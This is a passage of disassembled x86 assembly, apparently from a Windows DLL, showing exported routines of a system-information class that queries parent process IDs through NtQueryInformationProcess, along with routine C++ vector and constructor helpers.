Ordinal1330	endp

; Exported entry 1332.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1332
Ordinal1332	proc near		; CODE XREF: sub_6AF4D47D+Dp
					; sub_6AF4D49D+1Bp ...

arg_0		= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+arg_0]
		mov	esi, ecx
		cmp	esi, edi
		jz	short loc_6AF4D2E7
		lea	eax, [edi+8]
		push	eax		; lpString2
		lea	eax, [esi+8]
		push	eax		; lpString1
		call	ds:lstrcpyA
		mov	eax, [edi+4]
		mov	[esi+4], eax

loc_6AF4D2E7:				; CODE XREF: Ordinal1332+Aj
		pop	edi
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1332	endp

; Exported entry 1341.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1341(DWORD Args,	int)
		public Ordinal1341
Ordinal1341	proc near		; CODE XREF: Ordinal1352+1Cp
					; DATA XREF: .rdata:off_6AF66098o

Dst		= byte ptr -18h
var_4		= dword	ptr -4
Args		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 18h
		mov	eax, [ebp+arg_4]
		push	ebx
		push	esi
		push	edi
		xor	edi, edi
		mov	esi, ecx
		mov	[eax], edi
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF4D388
		cmp	[esi+8], edi
		jz	short loc_6AF4D388
		push	[ebp+Args]	; dwProcessId
		push	edi		; bInheritHandle
		push	410h		; dwDesiredAccess
		call	ds:OpenProcess
		mov	ebx, eax
		cmp	ebx, edi
		jnz	short loc_6AF4D33C
		call	ds:GetLastError
		push	eax
		push	[ebp+Args]	; Args
		push	offset aCntqueryinform ; "CNtQueryInformationProcess::GetParentPr"...
		call	sub_6AF3102E
		add	esp, 0Ch
		jmp	short loc_6AF4D393
; ---------------------------------------------------------------------------

loc_6AF4D33C:				; CODE XREF: Ordinal1341+33j
		push	18h		; Size
		lea	eax, [ebp+Dst]
		push	edi		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		push	edi
		push	18h
		lea	eax, [ebp+Dst]
		push	eax
		push	edi
		push	ebx
		call	dword ptr [esi+8]
		mov	esi, eax
		cmp	esi, edi
		jz	short loc_6AF4D370
		push	esi
		push	[ebp+Args]	; Args
		push	offset aCntqueryinfo_0 ; "CNtQueryInformationProcess::GetParentPr"...
		call	sub_6AF3102E
		add	esp, 0Ch
		jmp	short loc_6AF4D378
; ---------------------------------------------------------------------------

loc_6AF4D370:				; CODE XREF: Ordinal1341+6Dj
		mov	eax, [ebp+var_4]
		mov	ecx, [ebp+arg_4]
		mov	[ecx], eax

loc_6AF4D378:				; CODE XREF: Ordinal1341+80j
		push	ebx		; hObject
		call	ds:CloseHandle
		xor	eax, eax
		cmp	esi, edi
		setz	al
		jmp	short loc_6AF4D395
; ---------------------------------------------------------------------------

loc_6AF4D388:				; CODE XREF: Ordinal1341+19j
					; Ordinal1341+1Ej
		push	offset aCntqueryinfo_1 ; "CNtQueryInformationProcess::GetParentPr"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF4D393:				; CODE XREF: Ordinal1341+4Cj
		xor	eax, eax

loc_6AF4D395:				; CODE XREF: Ordinal1341+98j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal1341	endp

; Exported entry 1345.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1345
Ordinal1345	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		cmp	[esp+arg_0], 0
		push	esi
		mov	esi, ecx
		jz	short loc_6AF4D3AF
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF4D3D8

loc_6AF4D3AF:				; CODE XREF: Ordinal1345+8j
		push	edi
		xor	edi, edi
		inc	edi
		cmp	[esp+8+arg_0], 0
		jnz	short loc_6AF4D3C0
		and	dword ptr [esi+8], 0
		jmp	short loc_6AF4D3D5
; ---------------------------------------------------------------------------

loc_6AF4D3C0:				; CODE XREF: Ordinal1345+1Cj
		push	offset aNtqueryinforma ; "NtQueryInformationProcess"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF4D3D5
		xor	edi, edi

loc_6AF4D3D5:				; CODE XREF: Ordinal1345+22j
					; Ordinal1345+35j
		mov	eax, edi
		pop	edi

loc_6AF4D3D8:				; CODE XREF: Ordinal1345+11j
		pop	esi
		retn	4
Ordinal1345	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4D3DC	proc near		; CODE XREF: sub_6AF4E8B4+4Ep
					; sub_6AF4E8B4:loc_6AF4E919p ...
		mov	edx, [ecx+4]
		test	edx, edx
		jnz	short loc_6AF4D3E6
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF4D3E6:				; CODE XREF: sub_6AF4D3DC+5j
		mov	eax, [ecx+8]
		sub	eax, edx
		cdq
		mov	ecx, 124h
		idiv	ecx
		retn
sub_6AF4D3DC	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4D3F4	proc near		; CODE XREF: sub_6AF4D981+3Ap
					; sub_6AF4DBE5+2Dp ...
		mov	edx, [ecx+4]
		test	edx, edx
		jnz	short loc_6AF4D3FE
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF4D3FE:				; CODE XREF: sub_6AF4D3F4+5j
		mov	eax, [ecx+0Ch]
		sub	eax, edx
		cdq
		mov	ecx, 10Ch
		idiv	ecx
		retn
sub_6AF4D3F4	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4D40C	proc near		; CODE XREF: sub_6AF4D981+4Ep
					; sub_6AF4D981:loc_6AF4D9E6p ...
		mov	edx, [ecx+4]
		test	edx, edx
		jnz	short loc_6AF4D416
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF4D416:				; CODE XREF: sub_6AF4D40C+5j
		mov	eax, [ecx+8]
		sub	eax, edx
		cdq
		mov	ecx, 10Ch
		idiv	ecx
		retn
sub_6AF4D40C	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4D424	proc near		; CODE XREF: sub_6AF4E8B4+3Ap
					; sub_6AF4EB6A+10p
		mov	edx, [ecx+4]
		test	edx, edx
		jnz	short loc_6AF4D42E
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF4D42E:				; CODE XREF: sub_6AF4D424+5j
		mov	eax, [ecx+0Ch]
		sub	eax, edx
		cdq
		mov	ecx, 124h
		idiv	ecx
		retn
sub_6AF4D424	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

sub_6AF4D43C	proc near		; CODE XREF: sub_6AF4D61F+25p
					; sub_6AF4D981+60p ...

var_50		= dword	ptr -50h
var_28		= byte ptr -28h
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_110	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		push	offset aVectorTTooLong ; "vector<T> too	long"
		lea	ecx, [ebp+var_28]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_28]
		push	eax
		lea	ecx, [ebp+var_50]
		call	sub_6AF3136A
		push	offset dword_6AF61E98
		lea	eax, [ebp+var_50]
		push	eax
		mov	[ebp+var_50], offset off_6AF54898
		call	_CxxThrowException
sub_6AF4D43C	endp

; ---------------------------------------------------------------------------
		db 0CCh

; =============== S U B	R O U T	I N E =======================================


sub_6AF4D47D	proc near		; CODE XREF: sub_6AF4D981+1DFp
					; sub_6AF4D981+243p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		mov	esi, [esp+4+arg_0]
		jmp	short loc_6AF4D495
; ---------------------------------------------------------------------------

loc_6AF4D484:				; CODE XREF: sub_6AF4D47D+1Cj
		push	[esp+4+arg_8]
		mov	ecx, esi
		call	Ordinal1332
		add	esi, 10Ch

loc_6AF4D495:				; CODE XREF: sub_6AF4D47D+5j
		cmp	esi, [esp+4+arg_4]
		jnz	short loc_6AF4D484
		pop	esi
		retn
sub_6AF4D47D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4D49D	proc near		; CODE XREF: sub_6AF4D5B9+10p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	edi
		mov	edi, [ebp+arg_4]
		cmp	[ebp+arg_0], edi
		jz	short loc_6AF4D4C3
		push	esi
		mov	esi, 10Ch

loc_6AF4D4AF:				; CODE XREF: sub_6AF4D49D+23j
		sub	[ebp+arg_8], esi
		mov	ecx, [ebp+arg_8]
		sub	edi, esi
		push	edi
		call	Ordinal1332
		cmp	edi, [ebp+arg_0]
		jnz	short loc_6AF4D4AF
		pop	esi

loc_6AF4D4C3:				; CODE XREF: sub_6AF4D49D+Aj
		mov	eax, [ebp+arg_8]
		pop	edi
		pop	ebp
		retn
sub_6AF4D49D	endp

; [0000001D BYTES: COLLAPSED FUNCTION unknown_libname_11. PRESS	KEYPAD "+" TO EXPAND]
; Exported entry 1331.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1331
Ordinal1331	proc near		; CODE XREF: sub_6AF4D6A2+1Cp
					; sub_6AF4D7F0+17p ...

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5F9E4
		call	Ordinal1332
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1331	endp

; Exported entry 1337.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1337
Ordinal1337	proc near		; CODE XREF: Ordinal1346+14p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal889
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], offset	off_6AF5FB14
		mov	eax, esi
		pop	esi
		retn
Ordinal1337	endp

; Exported entry 1342.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1342(LPCSTR Args)
		public Ordinal1342
Ordinal1342	proc near		; CODE XREF: Ordinal1339+13p
					; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4

		push	esi
		push	[esp+4+Args]	; Args
		mov	esi, ecx
		call	Ordinal896
		test	eax, eax
		jz	short loc_6AF4D52F
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF4D533

loc_6AF4D52F:				; CODE XREF: Ordinal1342+Ej
		xor	eax, eax
		jmp	short loc_6AF4D54F
; ---------------------------------------------------------------------------

loc_6AF4D533:				; CODE XREF: Ordinal1342+19j
		push	edi
		xor	edi, edi
		push	offset aNtqueryinforma ; "NtQueryInformationProcess"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF4D54C
		xor	edi, edi

loc_6AF4D54C:				; CODE XREF: Ordinal1342+34j
		mov	eax, edi
		pop	edi

loc_6AF4D54F:				; CODE XREF: Ordinal1342+1Dj
		pop	esi
		retn	4
Ordinal1342	endp

; Exported entry 1343.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1343(LPCSTR Args, DWORD dwFlags)
		public Ordinal1343
Ordinal1343	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4
dwFlags		= dword	ptr  8

		push	esi
		push	[esp+4+dwFlags]	; dwFlags
		mov	esi, ecx
		push	[esp+8+Args]	; Args
		call	Ordinal897
		test	eax, eax
		jz	short loc_6AF4D572
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF4D576

loc_6AF4D572:				; CODE XREF: Ordinal1343+12j
		xor	eax, eax
		jmp	short loc_6AF4D592
; ---------------------------------------------------------------------------

loc_6AF4D576:				; CODE XREF: Ordinal1343+1Dj
		push	edi
		xor	edi, edi
		push	offset aNtqueryinforma ; "NtQueryInformationProcess"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF4D58F
		xor	edi, edi

loc_6AF4D58F:				; CODE XREF: Ordinal1343+38j
		mov	eax, edi
		pop	edi

loc_6AF4D592:				; CODE XREF: Ordinal1343+21j
		pop	esi
		retn	8
Ordinal1343	endp

; Exported entry 630.
; Exported entry 633.
; Exported entry 850.
; Exported entry 1064.
; Exported entry 1070.
; Exported entry 1340.
; Exported entry 1344.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1064
Ordinal1064	proc near		; CODE XREF: Ordinal563+3Bp
					; DATA XREF: .rdata:off_6AF66098o
		and	dword ptr [ecx+8], 0 ; ccL30_630
					; ccL30_633
					; ccL30_850
					; ccL30_1064
					; ccL30_1070
					; ccL30_1340
		jmp	Ordinal898
Ordinal1064	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4D59F	proc near		; CODE XREF: sub_6AF4D8B8+17p
					; sub_6AF4D8F2+13p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF4D5D3
		add	esp, 10h
		leave
		retn
sub_6AF4D59F	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4D5B9	proc near		; CODE XREF: sub_6AF4D981+233p
					; sub_6AF4DBE5+203p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF4D49D
		add	esp, 10h
		leave
		retn
sub_6AF4D5B9	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4D5D3	proc near		; CODE XREF: sub_6AF4D59F+10p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	edi
		mov	edi, [ebp+arg_0]
		cmp	edi, [ebp+arg_4]
		jz	short loc_6AF4D5F9
		push	esi
		mov	esi, 10Ch

loc_6AF4D5E5:				; CODE XREF: sub_6AF4D5D3+23j
		mov	ecx, [ebp+arg_8]
		push	edi
		call	Ordinal1332
		add	[ebp+arg_8], esi
		add	edi, esi
		cmp	edi, [ebp+arg_4]
		jnz	short loc_6AF4D5E5
		pop	esi

loc_6AF4D5F9:				; CODE XREF: sub_6AF4D5D3+Aj
		mov	eax, [ebp+arg_8]
		pop	edi
		pop	ebp
		retn
sub_6AF4D5D3	endp

; Exported entry 1349.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1349
Ordinal1349	proc near		; CODE XREF: Ordinal1347+9p
					; Ordinal1348+3p ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+4]
		call	Ordinal981
		lea	ecx, [esi+7Ch]
		call	Ordinal1430
		lea	ecx, [esi+6Ch]
		and	dword ptr [ecx+8], 0
		pop	esi
		jmp	Ordinal898
Ordinal1349	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4D61F	proc near		; CODE XREF: Ordinal1333+1Cp
					; Ordinal1335+11p

arg_0		= dword	ptr  4

		push	esi
		xor	eax, eax
		push	edi
		mov	edi, [esp+8+arg_0]
		cmp	edi, eax
		mov	esi, ecx
		mov	[esi+4], eax
		mov	[esi+8], eax
		mov	[esi+0Ch], eax
		jnz	short loc_6AF4D63A
		xor	al, al
		jmp	short loc_6AF4D663
; ---------------------------------------------------------------------------

loc_6AF4D63A:				; CODE XREF: sub_6AF4D61F+15j
		cmp	edi, 0F4898Dh
		jbe	short loc_6AF4D649
		mov	ecx, esi
		call	sub_6AF4D43C
; ---------------------------------------------------------------------------

loc_6AF4D649:				; CODE XREF: sub_6AF4D61F+21j
		imul	edi, 10Ch
		push	edi		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		add	edi, eax
		mov	[esi+4], eax
		mov	[esi+8], eax
		pop	ecx
		mov	[esi+0Ch], edi
		mov	al, 1

loc_6AF4D663:				; CODE XREF: sub_6AF4D61F+19j
		pop	edi
		pop	esi
		retn	4
sub_6AF4D61F	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4D668	proc near		; CODE XREF: sub_6AF4D7BC+10p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		mov	esi, [esp+4+arg_0]
		jmp	short loc_6AF4D67D
; ---------------------------------------------------------------------------

loc_6AF4D66F:				; CODE XREF: sub_6AF4D668+19j
		mov	eax, [esi]
		push	0
		mov	ecx, esi
		call	dword ptr [eax]
		add	esi, 10Ch

loc_6AF4D67D:				; CODE XREF: sub_6AF4D668+5j
		cmp	esi, [esp+4+arg_4]
		jnz	short loc_6AF4D66F
		pop	esi
		retn
sub_6AF4D668	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4D685	proc near		; CODE XREF: sub_6AF4D7D6+10p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		mov	esi, [esp+4+arg_0]
		jmp	short loc_6AF4D69A
; ---------------------------------------------------------------------------

loc_6AF4D68C:				; CODE XREF: sub_6AF4D685+19j
		mov	eax, [esi]
		push	0
		mov	ecx, esi
		call	dword ptr [eax]
		add	esi, 124h

loc_6AF4D69A:				; CODE XREF: sub_6AF4D685+5j
		cmp	esi, [esp+4+arg_4]
		jnz	short loc_6AF4D68C
		pop	esi
		retn
sub_6AF4D685	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4D6A2	proc near		; CODE XREF: sub_6AF4D819+13p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	edi
		mov	edi, [ebp+arg_0]
		cmp	edi, [ebp+arg_4]
		jz	short loc_6AF4D6CE
		push	esi
		mov	esi, 10Ch

loc_6AF4D6B4:				; CODE XREF: sub_6AF4D6A2+29j
		cmp	[ebp+arg_8], 0
		jz	short loc_6AF4D6C3
		mov	ecx, [ebp+arg_8]
		push	edi
		call	Ordinal1331

loc_6AF4D6C3:				; CODE XREF: sub_6AF4D6A2+16j
		add	[ebp+arg_8], esi
		add	edi, esi
		cmp	edi, [ebp+arg_4]
		jnz	short loc_6AF4D6B4
		pop	esi

loc_6AF4D6CE:				; CODE XREF: sub_6AF4D6A2+Aj
		mov	eax, [ebp+arg_8]
		pop	edi
		pop	ebp
		retn
sub_6AF4D6A2	endp

; Exported entry 1338.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1338
Ordinal1338	proc near		; CODE XREF: Ordinal1347+19p
					; sub_6AF4D836+3p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], offset	off_6AF5FB14
		call	Ordinal898
		mov	ecx, esi
		pop	esi
		jmp	Ordinal891
Ordinal1338	endp

; Exported entry 1339.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1339
Ordinal1339	proc near		; CODE XREF: Ordinal1348+1Bp
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+8], 0
		call	Ordinal898
		push	offset aNtdll_dll ; "NTDLL.DLL"
		mov	ecx, esi
		call	Ordinal1342
		pop	esi
		retn
Ordinal1339	endp

; Exported entry 1346.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1346
Ordinal1346	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+4]
		mov	dword ptr [esi], offset	off_6AF5FB24
		call	Ordinal974
		lea	ecx, [esi+6Ch]
		call	Ordinal1337
		and	dword ptr [esi+78h], 0
		lea	ecx, [esi+7Ch]
		call	Ordinal1423
		and	dword ptr [esi+0B4h], 0
		mov	eax, esi
		pop	esi
		retn
Ordinal1346	endp

; Exported entry 1347.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1347
Ordinal1347	proc near		; CODE XREF: sub_6AF4D852+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5FB24
		call	Ordinal1349
		lea	ecx, [esi+7Ch]
		call	Ordinal1424
		lea	ecx, [esi+6Ch]
		call	Ordinal1338
		lea	ecx, [esi+4]
		pop	esi
		jmp	Ordinal975
Ordinal1347	endp

; Exported entry 1348.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1348
Ordinal1348	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal1349
		and	dword ptr [esi+78h], 0
		lea	ecx, [esi+4]
		call	Ordinal980
		test	eax, eax
		jz	short loc_6AF4D78A
		lea	ecx, [esi+6Ch]
		call	Ordinal1339
		test	eax, eax
		jz	short loc_6AF4D78A
		mov	dword ptr [esi+78h], 1

loc_6AF4D78A:				; CODE XREF: Ordinal1348+16j
					; Ordinal1348+22j
		lea	ecx, [esi+7Ch]
		call	Ordinal1429
		test	eax, eax
		mov	[esi+0B4h], eax
		jnz	short loc_6AF4D7B7
		cmp	[esi+78h], eax
		jnz	short loc_6AF4D7B7
		push	offset aCsysteminfoCre ; "CSystemInfo::Create()	: m_bToolHelpOk	="...
		call	sub_6AF3102E
		pop	ecx
		mov	ecx, esi
		call	Ordinal1349
		xor	eax, eax
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_6AF4D7B7:				; CODE XREF: Ordinal1348+3Bj
					; Ordinal1348+40j
		xor	eax, eax
		inc	eax
		pop	esi
		retn
Ordinal1348	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4D7BC	proc near		; CODE XREF: Ordinal1334-5C8p
					; sub_6AF4D8B8+23p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF4D668
		add	esp, 10h
		leave
		retn
sub_6AF4D7BC	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4D7D6	proc near		; CODE XREF: sub_6AF4D954+Fp
					; sub_6AF4E8B4+119p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF4D685
		add	esp, 10h
		leave
		retn
sub_6AF4D7D6	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4D7F0	proc near		; CODE XREF: sub_6AF4D89B+13p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_4]
		test	esi, esi
		jbe	short loc_6AF4D816

loc_6AF4D7FB:				; CODE XREF: sub_6AF4D7F0+24j
		cmp	[ebp+arg_0], 0
		jz	short loc_6AF4D80C
		push	[ebp+arg_8]
		mov	ecx, [ebp+arg_0]
		call	Ordinal1331

loc_6AF4D80C:				; CODE XREF: sub_6AF4D7F0+Fj
		add	[ebp+arg_0], 10Ch
		dec	esi
		jnz	short loc_6AF4D7FB

loc_6AF4D816:				; CODE XREF: sub_6AF4D7F0+9j
		pop	esi
		pop	ebp
		retn
sub_6AF4D7F0	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4D819	proc near		; CODE XREF: sub_6AF4D981+C6p
					; sub_6AF4D981+F8p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF4D6A2
		add	esp, 14h
		leave
		retn
sub_6AF4D819	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4D836(void *, char)
sub_6AF4D836	proc near		; DATA XREF: .rdata:off_6AF5FB14o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1338
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4D84C
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4D84C:				; CODE XREF: sub_6AF4D836+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4D836	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4D852(void *, char)
sub_6AF4D852	proc near		; DATA XREF: .rdata:off_6AF5FB24o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1347
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4D868
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4D868:				; CODE XREF: sub_6AF4D852+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4D852	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR Ordinal1334

loc_6AF4D86E:				; CODE XREF: Ordinal1334+Cj
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF4D88D
		push	esi
		push	dword ptr [esi+8]
		push	eax
		call	sub_6AF4D7BC
		push	dword ptr [esi+4] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h

loc_6AF4D88D:				; CODE XREF: Ordinal1334-5CFj
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		and	dword ptr [esi+0Ch], 0
		pop	esi
		retn
; END OF FUNCTION CHUNK	FOR Ordinal1334

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4D89B	proc near		; CODE XREF: sub_6AF4D92F+Dp

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF4D7F0
		add	esp, 14h
		leave
		retn
sub_6AF4D89B	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4D8B8	proc near		; CODE XREF: sub_6AF4DEF9+15p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	ebx
		mov	ebx, [esp+4+arg_4]
		cmp	ebx, [esp+4+arg_8]
		push	esi
		mov	esi, ecx
		jz	short loc_6AF4D8E7
		push	edi
		push	ebx
		push	dword ptr [esi+8]
		push	[esp+14h+arg_8]
		call	sub_6AF4D59F
		push	esi
		push	dword ptr [esi+8]
		mov	edi, eax
		push	edi
		call	sub_6AF4D7BC
		add	esp, 18h
		mov	[esi+8], edi
		pop	edi

loc_6AF4D8E7:				; CODE XREF: sub_6AF4D8B8+Cj
		mov	eax, [esp+8+arg_0]
		pop	esi
		mov	[eax], ebx
		pop	ebx
		retn	0Ch
sub_6AF4D8B8	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4D8F2	proc near		; CODE XREF: Ordinal1352+B8p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		push	edi
		mov	edi, [esp+8+arg_4]
		mov	esi, ecx
		push	edi
		push	dword ptr [esi+8]
		lea	eax, [edi+10Ch]
		push	eax
		call	sub_6AF4D59F
		mov	eax, [esi+8]
		push	esi
		push	eax
		add	eax, 0FFFFFEF4h
		push	eax
		call	sub_6AF4D7BC
		add	dword ptr [esi+8], 0FFFFFEF4h
		mov	eax, [esp+20h+arg_0]
		add	esp, 18h
		mov	[eax], edi
		pop	edi
		pop	esi
		retn	8
sub_6AF4D8F2	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4D92F	proc near		; CODE XREF: sub_6AF4D981+DFp
					; sub_6AF4D981+1C7p ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF4D89B
		mov	eax, [ebp+arg_4]
		imul	eax, 10Ch
		add	esp, 10h
		add	eax, [ebp+arg_0]
		pop	ebp
		retn	0Ch
sub_6AF4D92F	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4D954	proc near		; CODE XREF: Ordinal1355+44p
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF4D973
		push	esi
		push	dword ptr [esi+8]
		push	eax
		call	sub_6AF4D7D6
		push	dword ptr [esi+4] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h

loc_6AF4D973:				; CODE XREF: sub_6AF4D954+8j
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		and	dword ptr [esi+0Ch], 0
		pop	esi
		retn
